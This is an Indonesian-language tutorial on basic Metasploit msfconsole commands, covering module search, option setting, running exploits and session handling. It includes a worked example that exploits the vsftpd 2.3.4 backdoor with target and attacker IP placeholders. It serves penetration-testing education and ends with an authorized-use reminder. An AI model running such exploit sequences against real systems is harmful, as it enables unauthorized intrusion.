# Perintah Dasar MSFconsole

## A. Apa Itu MSFconsole?

`msfconsole` adalah antarmuka CLI utama dalam Metasploit Framework. Untuk bisa menggunakan Metasploit secara efektif, penting untuk menguasai perintah-perintah dasarnya.

## B. Menjalankan MSFconsole:

```
msfconsole
```

Setelah dijalankan, kamu akan masuk ke CLI Metasploit:

```
msf6 >
```

## C. Daftar Perintah Dasar MSFconsole yang Wajib Diketahui

| Perintah | Fungsi |
|:--:|:--:|
| `help` atau `?`	| Menampilkan semua perintah yang tersedia. |
| `search <KEYWORD>` | Mencari `exploit`, `payload`, `auxiliary`, `dll`. |
| `use <NAMA_MODUL>` | Memilih modul tertentu untuk digunakan. |
| `info` |	Menampilkan informasi detail dari modul yang sedang dipilih. |
| `show options` | Menampilkan parameter yang bisa diatur pada modul. |
| `set <PARAMETER> <NILAI>` |	Mengatur parameter (contoh: `RHOSTS`, `LHOST`, `PAYLOAD`). |
| `unset <PARAMETER>`	| Menghapus nilai parameter yang telah diatur. |
| `show payloads	`| Menampilkan semua payload yang kompatibel. |
| `show exploits`	| Menampilkan semua exploit yang tersedia. |
| `show auxiliary` | Menampilkan modul bantu seperti scanner. |
| `exploit` atau `run` | Menjalankan modul exploit. |
| `back` | Kembali ke menu utama dari modul. |
| `exit` atau `quit` | Keluar dari msfconsole. |

## D. Contoh Penggunaan Sederhana:

```
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS <IP_TARGET>
set LHOST <IP_ATTACKER>
exploit
```

## E. Perintah Session

Jika exploit berhasil, biasanya akan membuka session:

| Perintah | Fungsi |
|:--:|:--:|
| `sessions` | Menampilkan daftar sesi aktif |
| `sessions -i <ID>`	| Masuk ke session yang aktif |
| `background`	| Menyimpan session ke latar belakang |
| `sessions -k <ID>` | Menghentikan session tertentu |

## Tips Tambahan
- Gunakan `tab` untuk auto-complete.
- Gunakan `Ctrl + C` untuk menghentikan exploit yang sedang berjalan.
- Gunakan `jobs` dan `kill <ID>` untuk melihat dan menghentikan job background.

> Gunakan hanya untuk pembelajaran dan pada sistem yang kamu punya izin untuk uji coba.
